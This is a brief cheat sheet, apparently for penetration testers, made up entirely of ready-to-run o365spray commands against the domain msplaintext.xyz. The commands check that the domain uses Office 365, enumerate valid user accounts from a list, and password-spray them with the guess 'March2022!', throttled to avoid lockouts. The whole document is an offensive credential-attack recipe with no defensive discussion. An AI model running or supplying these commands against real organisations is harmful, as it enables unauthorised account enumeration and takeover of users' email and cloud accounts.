# Office 365

% office365

## python3 - Verify Office365 usage
```
python3 o365spray.py --validate --domain msplaintext.xyz
```

## Enumerate Office365 users
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## Password spraying on Office365
```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
